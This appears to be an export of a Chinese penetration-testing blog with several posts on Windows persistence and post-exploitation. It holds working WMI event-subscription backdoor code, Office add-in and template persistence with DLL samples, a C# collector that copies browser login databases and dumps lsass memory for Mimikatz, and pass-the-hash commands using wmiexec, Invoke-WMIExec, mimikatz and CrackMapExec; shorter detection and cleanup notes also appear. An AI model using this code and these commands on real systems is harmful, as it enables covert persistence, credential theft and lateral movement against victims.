1SELECT * FROM Win32_VolumeChangeEvent Where EventType=2 每次创建 win32 进程时都会触发此事件： 1Select * From __InstanceCreationEvent Where TargetInstance Isa "Win32_Process" 1.3 Meta Queries元查询用来查询WMI命名空间和类结构的信息。最常见的用法是用来列举WMI命名空间的类结构。元查询是实例查询的一个子集，但是与对象查询不同的是，我们查询的是类的实例的定义。 格式如下： 1SELECT [Class property name | *] FROM [Meta_Class | SYSTEM CLASS NAME] &lt;WHERE [CONSTRAINT]&gt; 下面这个语句会查询所有以 WIN32 开头的WMI的类：SELECT * FROM Meta_Class WHERE __CLASS LIKE &quot;Win32%&quot; 下面这个语句会查询某个命名空间下的所有命名空间：SELECT Name FROM __NAMESPACE 注意，当不显示的指定命名空间时，默认的命名空间为ROOT\CIMV2。 0x02 与WMI交互Microsoft和一些第三方软件开发者为我们提供了许多能够与WMI交互的工具。 下面是部分工具的一个不完全的列表 1234567891、PowerShell2、wmic.exe3、wbemtest.exe4、WMI Explorer5、CIM Studio6、Windows Script Host (WSH) languages7、C/C++ via IWbem* COM API8、.NET using System.Management classes9、winrm.exe 0x03 WMI事件WMI事件分两类，包括本地事件（运行在本地上下文环境当中的单个进程的事件）和永久性WMI事件订阅。 本地事件有生命周期为进程宿主的周期，而永久性 WMI事件 是存储在WMI库中，以 SYSTEM 权限运行，并且重启后依然存在。 3.1 前置条件为了能够安装一个永久性的 WMI 事件订阅，必须满足两个条件： 一个 __EventFilter 查询，它创建一个过滤器，为我们的特定事件选择触发器; Event Consumer Class，代表一个事件触发时所执行的操作。 在 Event Consumers（事件处理）中，可用的标准事件处理类：12345LogFileEventConsumer： 将事件数据写入到指定的日志文件ActiveScriptEventConsumer： 用来执行VBScript/JScript程序NTEventLogEventConsumer：创建一个包含事件数据的日志入口点SMTPEventConsumer：将事件数据用邮件发送CommandLineEventConsumer：执行一条命令 利用点 ActiveScriptEventConsumer，允许执行任意脚本（支持 JScript 和 VBScript 引擎） CommandLineEventConsumer，允许执行任意命令 3.2 测试使用以下查询进行测试： Select * From __InstanceCreationEvent Where TargetInstance Isa &quot;Win32_Process&quot; 为了方便测试，此处使用 Powershell 的 Register-WMIEvent 安装触发器。 以上测试不符合实际需求。 3.3 Powershell 实例（命令执行）下面的 PowerShell 代码来自一个叫 SEADADDY 的恶意软件的修改版，用来通过WMI做持久化的 12345678910111213141516171819202122232425$EventFilterName = 'BotFilter11'$EventConsumerName = 'BotConsumer22'$EventFilterArgs = @&#123; EventNamespace = 'root\cimv2' Name = $EventFilterName Query = 'Select * From __InstanceCreationEvent Where TargetInstance Isa "Win32_Process"' QueryLanguage="WQL"&#125;$WMIEventFilter = Set-WmiInstance -NameSpace 'root\subscription' -Class __EventFilter -Arguments $EventFilterArgs -ErrorAction Stop$CommandLineumerArgs =@&#123; Name=$EventConsumerName CommandLineTemplate='C:\Windows\System32\calc.exe'&#125;$WMIEventConsumer = Set-WmiInstance -Namespace 'root\subscription' -Class CommandLineEventConsumer -Arguments $CommandLineumerArgs$WMIEventFilterToConsumerArgs = @&#123; Filter=$WMIEventFilter Consumer=$WMIEventConsumer&#125;Set-WmiInstance -Namespace 'root\subscription' -Class __FilterToConsumerBinding -Arguments $WMIEventFilterToConsumerArgs 但是这里实测失败，就算使用C#去添加 CommandLineEventConsumer 也是失败的，但是 LogFileEventConsumer 可成功。 3.4 C# 实例（代码执行）本示例执行的是 VBScript 使用SharpShooter生成 VBSceipt 类型的 payload。友情提示：一定要生成 64位的 payload。 1234567891011121314&gt; python SharpShooter.py --stageless --dotnetver 2 --payload vbs --output implantvbs --rawscfile payload64.bin _____ __ _____ __ __ / ___// /_ ____ __________ / ___// /_ ____ ____ / /____ _____ \__ \/ __ \/ __ `/ ___/ __ \__ \/ __ \/ __ \/ __ \/ __/ _ \/ ___/ ___/ / / / / /_/ / / / /_/ /__/ / / / / /_/ / /_/ / /_/ __/ / /____/_/ /_/\__,_/_/ / .___/____/_/ /_/\____/\____/\__/\___/_/ /_/ Dominic Chell, @domchell, MDSec ActiveBreach, v2.0 [*] Written delivery payload to output/implantvbs.vbs运行vbs，成功上线，再进行 base64 编码&gt; base64 -i output/implantvbs.vbs &gt;&gt;implantvbs-base64.txt 示例代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970// WMI Event Subscription Peristence Demo// Author: @domchellusing System;using System.Text;using System.Management;namespace WMIPersistence&#123; class Program &#123; static void Main(string[] args) &#123; PersistWMI(); &#125; static void PersistWMI() &#123; ManagementObject myEventFilter = null; ManagementObject myEventConsumer = null; ManagementObject myBinder = null; string vbscript64 = &quot;&lt;INSIDE base64 encoded VBS here&gt;&quot;; string vbscript = Encoding.UTF8.GetString(Convert.FromBase64String(vbscript64)); try &#123; ManagementScope scope = new ManagementScope(@&quot;\\.\root\subscription&quot;); ManagementClass wmiEventFilter = new ManagementClass(scope, new ManagementPath(&quot;__EventFilter&quot;), null); String strQuery = @&quot;SELECT * FROM __InstanceCreationEvent WITHIN 5 &quot; + &quot;WHERE TargetInstance ISA \&quot;Win32_Process\&quot; &quot; + &quot;AND TargetInstance.Name = \&quot;notepad.exe\&quot;&quot;; WqlEventQuery myEventQuery = new WqlEventQuery(strQuery); myEventFilter = wmiEventFilter.CreateInstance(); myEventFilter[&quot;Name&quot;] = &quot;demoEventFilter&quot;; myEventFilter[&quot;Query&quot;] = myEventQuery.QueryString; myEventFilter[&quot;QueryLanguage&quot;] = myEventQuery.QueryLanguage; myEventFilter[&quot;EventNameSpace&quot;] = @&quot;\root\cimv2&quot;; myEventFilter.Put(); Console.WriteLine(&quot;[*] Event filter created.&quot;); myEventConsumer = new ManagementClass(scope, new ManagementPath(&quot;ActiveScriptEventConsumer&quot;), null).CreateInstance(); myEventConsumer[&quot;Name&quot;] = &quot;BadActiveScriptEventConsumer&quot;; myEventConsumer[&quot;ScriptingEngine&quot;] = &quot;VBScript&quot;; myEventConsumer[&quot;ScriptText&quot;] = vbscript; myEventConsumer.Put(); Console.WriteLine(&quot;[*] Event consumer created.&quot;); myBinder = new ManagementClass(scope, new ManagementPath(&quot;__FilterToConsumerBinding&quot;), null).CreateInstance(); myBinder[&quot;Filter&quot;] = myEventFilter.Path.RelativePath; myBinder[&quot;Consumer&quot;] = myEventConsumer.Path.RelativePath; myBinder.Put(); Console.WriteLine(&quot;[*] Subscription created&quot;); &#125; catch (Exception e) &#123; Console.WriteLine(e); &#125; // END CATCH Console.ReadKey(); &#125; // END FUNC &#125; // END CLASS&#125; // END NAMESPACE 管理员权限运行生成的exe，演示 GIF 0x04 WMI后门检测及清除4.1 Sysmon日志略…. 4.2 查看当前WMI Event12345678#List Event FiltersGet-WMIObject -Namespace root\Subscription -Class __EventFilter#List Event ConsumersGet-WMIObject -Namespace root\Subscription -Class __EventConsumer#List Event BindingsGet-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding 4.3 清除后门12345678#FilterGet-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter "Name='BotFilter82'" | Remove-WmiObject -Verbose#ConsumerGet-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer -Filter "Name='BotConsumer23'" | Remove-WmiObject -Verbose#BindingGet-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding -Filter "__Path LIKE '%BotFilter82%'" | Remove-WmiObject -Verbose 0x05 参考Persistence: “the continued or prolonged existence of something”: Part 3 – WMI Event SubscriptionWMI Attacks利用WMI构建无文件后门（基础篇）]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
        <tag>权限维持</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【权限维持】Microsoft Office]]></title>
    <url>%2F2019%2F05%2F%E3%80%90%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E3%80%91Microsoft%20Office%2F</url>
    <content type="text"><![CDATA[本文是针对Windows常见持久控制的第一次说明。 0x00 前言前段时间有过个需求，判断 Office是否开启宏，索性将 Windows常见持久控制 中有关 Office 的记录也在后文写一下。 判断是否安装了 Microsoft Office 判断是否开启了 宏 相关利用 0x01 环境说明12345Microsoft Windows 7 Ultimate x64- Office 2007（实际环境）- Office 2010（测试环境）- Office 2013（测试环境）- Office 2016（测试环境） 0x02 相关判断 VBAWarnings 键值数值数据说明 12341:启用所有宏2:禁用所有宏并发出通知3:禁用无数字部署的所有宏4:禁用所有宏并且不通知 代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455// 通过注册表检测 Office 是否开启宏 private static void OfficeVBAWarnings(string OfficeVersion) &#123; List&lt;string&gt; OfficeFeatures = new List&lt;string&gt;() &#123; "Excel", "Word", "PowerPoint" &#125;; foreach (string Features in OfficeFeatures) &#123; string basekey = @"SOFTWARE\Microsoft\Office\" + OfficeVersion + @"\" + Features + @"\Security"; RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(basekey); if (registryKey != null) &#123; string[] ValueNames = registryKey.GetValueNames(); if (registryKey.ValueCount == 0) &#123; Console.WriteLine(" [&gt;] &#123;0&#125; VBAWarnings: 2", Features); &#125; else &#123; foreach (string KeyName in ValueNames) &#123; object VBAWarnings = registryKey.GetValue("VBAWarnings"); Console.WriteLine(" [&gt;] &#123;0&#125; VBAWarnings: &#123;1&#125;", Features, VBAWarnings); &#125; &#125; &#125; &#125; &#125; // 通过注册表检测 Office 版本 private static void OfficeIsInstall(string OfficeVersion) &#123; string basekey = @"SOFTWARE\Microsoft\Office\" + OfficeVersion + @"\Common\InstallRoot"; RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(basekey); if (registryKey != null) &#123; if (registryKey.GetValue("Path") != null) &#123; Console.WriteLine(" [&gt;] Microsoft Office Version: &#123;0&#125;", OfficeVersion); OfficeVBAWarnings(OfficeVersion); &#125; &#125; &#125; static void Main(string[] args) &#123; List&lt;string&gt; OfficeVersions = new List&lt;string&gt;() &#123; "8.0", "9.0", "10.0", "11.0", "12.0", "14.0", "15.0", "16.0" &#125;; foreach (string OfficeVersion in OfficeVersions) &#123; OfficeIsInstall(OfficeVersion); &#125; &#125; 0x03 Office 模板宏每次 Office 程序启动时都会加载使用 Office 程序中的基本模板。 相关位置 1234Word Normal.dotm位置：C:\Users(username)\AppData\Roaming\Microsoft\Templates\Normal.dotmExcel Personal.xlsb位置：C:\Users(username)\AppData\Roaming\Microsoft\Excel\XLSTART\PERSONAL.XLSB 这一部分在倾旋的博客有提到 新建宏名字 –&gt; word 为AutoOpen， Excel 为Auto_Open 使用 GIF 进行演示（Excel 同理） 本地使用相对应的 Office 版本生成的全局宏，替换目标机器对应的 Office 版本的全局宏，可行。 0x04 Office 加载项Office 中支持不同类型的加载项，从本质上来讲，Office 套装有很多受信任的位置，当放置库文件时，在打开 Office 程序时，会自动加载库文件。在 Office 的信任中心选择禁用加载项，实际上不会禁用WLL，也不会阻止VBA代码执行。 1）Word 的 WLL 加载项Word 的三个默认加载项位置如下所示： 对用户位置中的 Startup 进一步调查发现，它是 Word 默认存放全局模板和加载项的文件夹，当启动Word时，程序会自动加载 Startup 文件夹中所有*.dot、*.dotx或*.dotm格式的Word文件，也可以托管拓展名为 * .wll 的文件。而* .wll 文件本质上是一个带有额外特定于Office的扩展的DLL。这意味着* .wll 文件起码可以实现基本的 DLL 功能，我们只需要将*.dll 重命名为 *.wll，放入此文件夹中，可获取当前启动 word 的用户的执行权限。 示例： 123456789101112131415161718192021222324int Run()&#123; system("calc"); return 0;&#125;BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)&#123; switch (ul_reason_for_call) &#123; case DLL_PROCESS_ATTACH: Run(); // MessageBox(NULL, L"Hello World，I'm RcoIl", L"demo", MB_OK); // WinExec("calc.exe", SW_SHOWNORMAL); case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; &#125; return TRUE;&#125; 在这步骤出现了无法加载 wll 问题，所以我直接提问 Dominic Chell.，他给我的回答是： 123我在测试的时候也遇到了这样的问题，我认为它是使用了 UI 来弹出东西的，所以建议使用一个简单的 MessageBox 进行测试。并且确保是从 attach 当中调用 Run()。在使用 MessageBox 时，确保没有使用任何有关系统的东西（避免缺失 DLL），并尝试所有的switch cases exp 思路就不说了。 所以我最后使用了上面代码注释行。成功，结果如下。 2）Excel 的 XLL 加载项12在HKEY_CURRENT_USER\Software\Microsoft\Office\12.0\Excel\Options注册表项中添加一个键值OPEN /R DemoAddin.xll （字符串值） Excel 启动时，会自动检索 C:\Users(username)\AppData\Roaming\Microsoft\AddIns目录，所以不需要写入绝对路径，默认自动加载。 1// DemoAddin.xll EXPORTS is xlAutoOpen 3）PowerPoint 的 VBA 加载项1HKEY_CURRENT_USER\Software\Microsoft\Office\12.0\PowerPoint\AddIns\&lt;AddInName&gt; 文件格式为 *.ppam 或 *.ppa，也是与Excel 一样，放入AddIns 目录中。设置 Autoload 键值为 1 ，更改PowerPoint 启动时自动加载加载项。 关于wll(DLL) 、 xll(dll) 和 ppam(VBA) 的利用，可自行研究。 4）更多更多内容请阅读文章底部的参考文章。 0x05 参考Office Application StartupMAINTAINING ACCESS WITH NORMAL.DOTMBeyond good ol’ Run key, Part 62Add-In Opportunities for Office PersistencePersistence: “the continued or prolonged existence of something”: Part 1 – Microsoft OfficeEvilClippy]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
        <tag>权限维持</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【编程】通过编程实现的本地机器信息收集]]></title>
    <url>%2F2019%2F05%2F%E3%80%90%E7%BC%96%E7%A8%8B%E3%80%91%E9%80%9A%E8%BF%87%E7%BC%96%E7%A8%8B%E5%AE%9E%E7%8E%B0%E7%9A%84%E6%9C%AC%E5%9C%B0%E6%9C%BA%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%2F</url>
    <content type="text"><![CDATA[每获取一台机器权限，如果每次都手动操作重复一样的信息收集工作，无疑加大了工作量。 0x00 前言可选用 bat、C++、C# 进行编写程序，前两者运行无条件限制，后者需要判断 .NET 版本，由于一直是对 C# 较感兴趣，所以使用后者进行编写，也可以直接使用 execute-assembly 执行。 本文多数模块取之文末的 github 项目，本项目地址 - SharpGetBasisDown。 0x01 信息收集模块1）安全产品检测123456789101112131415161718192021222324252627282930313233343536373839404142public static void AV_EDR() &#123; /**- 获取进程信息 * - 枚举杀软进程列表（自定义列表） * - 存在则输出 * - 代码实现 * - 参考：https://raw.githubusercontent.com/harleyQu1nn/AggressorScripts/master/AVQuery.cna **/ string[] avproducts = &#123; "Skynet",...., "GDScan" &#125;; Process[] proces = Process.GetProcesses(Environment.MachineName); Console.WriteLine("[+] Enumerating EDR products and Antivirus Processes on " + Environment.MachineName + "..."); Console.WriteLine("[+] Loaded " + avproducts.Length + " AV Process Names"); for (int i = 0; i &lt; proces.Length; i++) &#123; for (int a = 0; a &lt; avproducts.Length; a++) &#123; string processSearch = avproducts[a]; if (proces[i].ProcessName.Equals(processSearch)) &#123; Console.WriteLine("\t[!] Found AV Process: " + proces[i].ProcessName); &#125; &#125; &#125; /**- 枚举列表（自定义列表） * - 使用 File.Exists 检测文件是否存在 * - 存在则输出 * - 代码实现 * - 参考：https://raw.githubusercontent.com/harleyQu1nn/AggressorScripts/master/EDR.cna **/ string[] edrproducts = &#123; "CiscoAMPCEFWDriver.sys",...., "amm6460.sys" &#125;; Console.WriteLine("[+] Loaded " + edrproducts.Length + " EDR Product Names"); string edrPath = @"C:\Windows\System32\drivers\"; for (int e = 0; e &lt; edrproducts.Length; e++) &#123; if (File.Exists(edrPath + edrproducts[e])) &#123; Console.WriteLine("\t[!] EDR driver found " + edrproducts[e]); &#125; &#125; &#125; 2）计算机架构1234567891011121314151617181920212223242526public static void Mains() &#123; /* * - 直接使用 Environment * - 参考：https://docs.microsoft.com/en-us/dotnet/api/system.environment?view=netframework-4.8 */ Console.WriteLine("[+] Environment members "); // 当前机器名 Console.WriteLine("\t[*] MachineName: &#123;0&#125;", Environment.MachineName); // 当前用户名 Console.WriteLine("\t[*] UserName: &#123;0&#125;", Environment.UserName); // 当前Domain名 Console.WriteLine("\t[*] UserDomainName: &#123;0&#125;", Environment.UserDomainName); // 当前系统版本 Console.WriteLine("\t[*] OSVersion: &#123;0&#125;", Environment.OSVersion.ToString()); // 当前目录 Console.WriteLine("\t[*] CurrentDirectory: &#123;0&#125;", Environment.CurrentDirectory); // 盘符 string[] drives = Environment.GetLogicalDrives(); Console.WriteLine("\t[*] GetLogicalDrives: &#123;0&#125;", String.Join(", ", drives)); // 当前程序名 string[] arguments = Environment.GetCommandLineArgs(); Console.WriteLine("\t[*] GetCommandLineArgs: &#123;0&#125;", String.Join(", ", arguments)); &#125; 3) 文件遍历12直接利用bat执行就可以FOR /F "Skip=1" %%I in ('wmic logicaldisk where "Size&lt;&gt;null" get name') Do (%%I &amp;&amp; dir /s /a %%I) 4) 执行命令获取相关12345678910111213141516171819202122232425262728293031323334353637383940414243// 运行基础命令查询 public static void GetBasisInfo() &#123; /* * - 获取系统基础信息 * - 管道没找到好的利用方式 * - 直接加载系统库，使用 system,此方法有个缺点，需要预分配内存，部分命令无法运行 * - 最后选择 ProcessStartInfo */ string[] commands = &#123; "systeminfo", "netstat -anop tcp", "ipconfig /all", "tasklist /v", "set", "query user", "net share", // 自启动的程序 "wmic startup list full", // 查看分区 "wmic logicaldisk where drivetype=3 get name,freespace,systemname,filesystem,volumeserialnumber,size", // 判断 .NET 版本 "dir %WINDIR%\\Microsoft.NET\\Framework\\v*", &#125;; foreach (string command in commands) &#123; string FileName = command.Replace("/", "").Replace("-", "").Replace("+", "").Replace("%", "").Replace(",", "").Replace("=", "").Replace("*", "").Replace("\\", ""); ProcessStartInfo proccessStartInfo = new ProcessStartInfo("cmd.exe", " /c " + command); proccessStartInfo.CreateNoWindow = true; Process proc = new Process &#123; StartInfo = proccessStartInfo &#125;; proc.StartInfo.RedirectStandardOutput = true; // 由调用程序获取输出信息 proc.StartInfo.UseShellExecute = false; // 是否使用操作系统shell启动 proc.StartInfo.CreateNoWindow = true; // 不显示程序窗口 proc.Start(); // 启动程序 string outlist = proc.StandardOutput.ReadToEnd(); TxtWriter(outlist, FileName); proc.WaitForExit(); // 等待程序执行完退出进程 proc.Close(); &#125; &#125; 5) 程序安装及版本1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253// 查找安装程序及版本 public static void GetInstalledApplications() &#123; /* * - 从注册 Uninstall 表项中提取相关信息，进行筛选 */ string basekey = "Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall"; RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(basekey); if (registryKey != null) &#123; // This key exists foreach (string rname in registryKey.GetSubKeyNames()) &#123; RegistryKey installedapp = registryKey.OpenSubKey(rname); if (installedapp != null) &#123; string displayname = (installedapp.GetValue("DisplayName") != null) ? installedapp.GetValue("DisplayName").ToString() : ""; string displayversion = (installedapp.GetValue("DisplayVersion") != null) ? installedapp.GetValue("DisplayVersion").ToString() : ""; string helplink = (installedapp.GetValue("HelpLink") != null) ? installedapp.GetValue("HelpLink").ToString() : ""; if (!(Regex.IsMatch(displayname, "^(Service Pack \\d+|(Definition\\s|Security\\s)?Update) for") &amp;&amp; Regex.IsMatch(helplink, "support\\.microsoft")) &amp;&amp; displayname != "") &#123; if (displayversion != "") &#123; //Console.Out.WriteLine("\t[*] " + displayname + " (" + displayversion + ")"); string displaynameversion = displayname + " (" + displayversion + ")"; TxtWriter(displayname, "查找安装程序及版本"); &#125; else &#123; //Console.Out.WriteLine("\t[*] " + displayname); TxtWriter(displayname, "查找安装程序及版本"); &#125; &#125; &#125; &#125; &#125; basekey = "Software\\Microsoft\\Installer\\Products"; registryKey = Registry.CurrentUser.OpenSubKey(basekey); if (registryKey != null) &#123; foreach (string rname in registryKey.GetSubKeyNames()) &#123; RegistryKey installedapp = registryKey.OpenSubKey(rname); if (installedapp != null) &#123; string displayname = (installedapp.GetValue("ProductName") != null) ? installedapp.GetValue("ProductName").ToString() : ""; if (displayname != "") //Console.Out.WriteLine("\t[*] " + displayname); TxtWriter(displayname, "查找安装程序及版本"); &#125; &#125; &#125; &#125; 6) 最近浏览的文件123456789101112131415161718public static void Recent() &#123; /* * - 最近预览的文件 * - 在 Tools 有朋友发过类似的 bat 脚本，实现原理是遍历用户目录下的lnk和url文件，然后调用vbs脚本获取快捷方式所指向的文件或者网址 * - 参考：https://www.t00ls.net/articles-46152.html */ string userPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData); string recents = @"Microsoft\Windows\Recent"; string recentsPath = Path.Combine(userPath, recents); DirectoryInfo di = new DirectoryInfo(recentsPath); //Console.WriteLine("[+] Recent Items in " + recentsPath); foreach (var file in di.GetFiles()) &#123; TxtWriter(file.Name, "最近预览的文件"); //Console.WriteLine("\t[*] " + file.Name); &#125; &#125; 7) 网络代理信息1234567891011121314151617181920212223242526272829public static void GetProxyInformation() &#123; /* * - GetSystemWebProxy() 返回使用当前模拟用户的 Internet Explorer 设置配置的代理 * - 使用代理访问 google.com 进行确认 * - 如果存在验证情况，则将相关信息进行输出 */ IWebProxy wp = WebRequest.GetSystemWebProxy(); string url = "https://www.google.com"; Uri req = new Uri(url); //Console.Out.WriteLine("[+] URL Requested: " + req.AbsoluteUri); Uri proxy = wp.GetProxy(req); if (String.Compare(req.AbsoluteUri, proxy.AbsoluteUri) != 0) &#123; //Console.Out.WriteLine("\t[*] Proxy: DIRECT"); TxtWriter(proxy.AbsoluteUri, "网络代理情况"); &#125; else if (wp.Credentials != null) &#123; NetworkCredential cred = wp.Credentials.GetCredential(req, "basic"); string[] cerd = &#123; cred.UserName, cred.Password, cred.Domain &#125;; foreach (string cers in cerd) &#123; TxtWriter(cers, "网络代理情况"); &#125; &#125; &#125; 8) 浏览器相关文件123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566// 获取 Chrome 相关 public static void ChromeLocation() &#123; string localAppData = Environment.GetEnvironmentVariable("USERPROFILE"); string ChromeBasePath = String.Format("&#123;0&#125;\\AppData\\Local\\Google\\Chrome", localAppData); if (Directory.Exists(ChromeBasePath)) &#123; // 获取 Chrome 浏览器相关文件路径 string ChromeHistoryPath = String.Format("&#123;0&#125;\\User Data\\Default\\History", ChromeBasePath); string ChromeBookmarkPath = String.Format("&#123;0&#125;\\User Data\\Default\\Bookmarks", ChromeBasePath); string ChromeCookiesPath = String.Format("&#123;0&#125;\\User Data\\Default\\Cookies", ChromeBasePath); string ChromeLoginDataPath = String.Format("&#123;0&#125;\\User Data\\Default\\Login Data", ChromeBasePath); string[] ChromePaths = &#123; ChromeHistoryPath, ChromeBookmarkPath, ChromeCookiesPath, ChromeLoginDataPath &#125;; // 创建文件夹、判断文件是否存在 string FilePath = CreateBrowserDirectory("\\Chrome"); foreach (string filePath in ChromePaths) &#123; if (File.Exists(filePath)) &#123; var FileName = filePath.Substring(filePath.LastIndexOf('\\')); File.Copy(filePath, FilePath + FileName); &#125; &#125; &#125; else &#123; Console.WriteLine("[+] Not Chrome Directory"); &#125; &#125; // 获取 Friefox 相关 public static void FroefoxLocation() &#123; // 获取 Friefox 浏览器目录 string localAppData = Environment.GetEnvironmentVariable("USERPROFILE"); string FirefoxBasePath = String.Format("&#123;0&#125;\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\", localAppData); if (Directory.Exists(FirefoxBasePath)) &#123; // 获取 Friefox 浏览器相关文件路径 string[] directories = Directory.GetDirectories(FirefoxBasePath); foreach (string directory in directories) &#123; string FirefoxPlaces = string.Format("&#123;0&#125;\\&#123;1&#125;", directory, "places.sqlite"); string FirefoxCer_1 = String.Format("&#123;0&#125;\\&#123;1&#125;", directory, "cert8.db"); string FirefoxCer_2 = String.Format("&#123;0&#125;\\&#123;1&#125;", directory, "cert9.db"); string FirefoxKey_1 = String.Format("&#123;0&#125;\\&#123;1&#125;", directory, "key3.db"); string FirefoxKey_2 = String.Format("&#123;0&#125;\\&#123;1&#125;", directory, "key4.db"); string FirefoxLogon = String.Format("&#123;0&#125;\\&#123;1&#125;", directory, "logins.json"); string[] FirefoxPaths = &#123; FirefoxPlaces, FirefoxCer_1, FirefoxCer_2, FirefoxKey_1, FirefoxKey_2, FirefoxLogon &#125;; // 创建文件夹、判断文件是否存在 string FilePath = CreateBrowserDirectory("\\Friefox"); foreach (string filePath in FirefoxPaths) &#123; if (File.Exists(filePath)) &#123; var FileName = filePath.Substring(filePath.LastIndexOf('\\')); File.Copy(filePath, FilePath + FileName); &#125; &#125; &#125; &#125; else &#123; Console.WriteLine("[+] Not Friefox Directory"); &#125; &#125; 9) MiniDump直接取用SharpDump，需要高权限 123456789101112131415161718192021222324252627282930313233343536[DllImport("dbghelp.dll", EntryPoint = "MiniDumpWriteDump", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)] static extern bool MiniDumpWriteDump(IntPtr hProcess, uint processId, SafeHandle hFile, uint dumpType, IntPtr expParam, IntPtr userStreamParam, IntPtr callbackParam); public static void Minidump() &#123; IntPtr targetProcessHandle = IntPtr.Zero; uint targetProcessId = 0; Process targetProcess = null; Process[] processes = Process.GetProcessesByName("lsass"); targetProcess = processes[0]; try &#123; targetProcessId = (uint)targetProcess.Id; targetProcessHandle = targetProcess.Handle; &#125; catch (Exception ex) &#123; Console.WriteLine(String.Format("\n[X] Error getting handle to &#123;0&#125; (&#123;1&#125;): &#123;2&#125;\n", targetProcess.ProcessName, targetProcess.Id, ex.Message)); return; &#125; bool bRet = false; string dumpDir = Program.CreateDirectory(); string dumpFile = String.Format("&#123;0&#125;\\lsass_pid-&#123;1&#125;.dmp", dumpDir, targetProcessId); //string zipFile = String.Format("&#123;0&#125;\\lsass_pid&#123;1&#125;.bin", dumpDir, targetProcessId); //Console.WriteLine(String.Format("\n[*] Dumping &#123;0&#125; (&#123;1&#125;) to &#123;2&#125;", targetProcess.ProcessName, targetProcess.Id, dumpFile)); using (FileStream fs = new FileStream(dumpFile, FileMode.Create, FileAccess.ReadWrite, FileShare.Write)) &#123; bRet = MiniDumpWriteDump(targetProcessHandle, targetProcessId, fs.SafeFileHandle, (uint)2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero); &#125; &#125; 10) 文件夹压缩加密AES 加密 0x02 信息解析模块 本文所缺失的相关代码，下步更新放出。 1) 压缩包解密AES 解密 2) MiniDump利用 subtee 的 PELoader 加载 Mimikatz 的自定义版本，加载 minidump 文件，运行 sekurlsa :: logonpasswords 和 sekurlsa::ekeys 3) 浏览器相关解析相关 sqlite 文件 解析密码文件 0x03 整合的相关项目列表AVQuery.cna EDR.cna SharpAttack SafetyKatz 这类型的开源项目，完全可以从中拓展，改写成适合自己的工具。]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
        <tag>C#</tag>
        <tag>Tools</tag>
        <tag>编程之道</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【知识回顾】Pass The Hash]]></title>
    <url>%2F2019%2F04%2F%E3%80%90%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BE%E3%80%91Pass%20The%20Hash%2F</url>
    <content type="text"><![CDATA[这个[ 知识回顾 ]系列文章，整合记录的是在掌握知识点中，所忽略的点、涉及的原理等； 0x00 前言在横向移动中，无论是域环境还是工作组环境，hash传递常用于在获取用户hash凭证后，且在不破解的情况下，重新使用它来欺骗身份验证系统在同一网络上创建新的经过身份验证的会话。 0x01 【知识回顾】Pass The Hash的原理 在windows系统中，通常会使用NTLM身份认证。 NTLM认证不使用明文口令，而是使用口令加密后的hash值，hash值由系统API生成(例如LsaLogonUser) NTLM就好像是一个令牌，有了这个令牌就相当于获取了这个令牌所属者的权限，它只是在身份验证的时候绕过了用户必须输入口令的那一步。 这个不是漏洞。 0x02 常用攻击方式 meterpreter 1use exploit/windows/smb/psexec_psh wmiexec 1wmiexec.py -hashes e6db7544d2c6d325ca3b108f3faa626d:5a625b04e786347908fc5f5d8a26dad5(LMHASH:NTHASH) rcoil/john@192.10.20.22 "whoami" Invoke-WMIExec 1Invoke-WMIExec -Target 192.10.20.22 -Domain rcoil.org -Username john -Hash 5a625b04e786347908fc5f5d8a26dad5 -Command "calc.exe" -verbose Invoke-SMBExec 1Invoke-SMBExec -Target 192.10.20.22 -Domain rcoil.org -Username john -Hash 5a625b04e786347908fc5f5d8a26dad5 -Command "calc.exe" -verbose mimikatz（Overpass-the-hash） 12privilege：：debugsekurlsa::pth /user:john /domain:rcoil.org /ntlm:5a625b04e786347908fc5f5d8a26dad5 CrackMapExec 1cme smb 192.10.20.22 -u john -H 5a625b04e786347908fc5f5d8a26dad5 -x whoami 0x03 如何检测由于Hash传递的结果为有效身份验证，因此建议检测查看涉及到的身份验证日志以确定正常用户行为与异常用户行为。这可能需要大量的数据分析，且可能导致许多误报的调查结果。 1） 工作组日志事件 产生NTLM身份验证 日志ID 4648 查看登录信息 显示账户已经成功登陆 日志ID 4624 所有用户登录事件 在4624事件中，登陆类型为2，表示是一个交互式登陆。这符合使用runas登陆的方式。 日志ID 4672 分配给新登录的特权 SQLServer 机器 在192.168.1.104机器上查看，在4624事件上能明确看到登陆类型为3，即网络登陆。且登陆身份验证数据包为NTLM。我们还将看到4672事件，因为我们利用的用户帐户是特权帐户 2） 域控日志事件以下是我们在不使用pass-the-hash执行NTLM身份验证时看到的日志摘要。这为我们提供了正常行为的基线。 Source Host Target Host Domain Controller 4648 - 使用显式凭据尝试登录 4624 - 帐户已成功登录。登录类型3，NTLM 4768 - 请求了Kerberos身份验证票证（TGT） 4624 - 帐户已成功登录。登录类型2 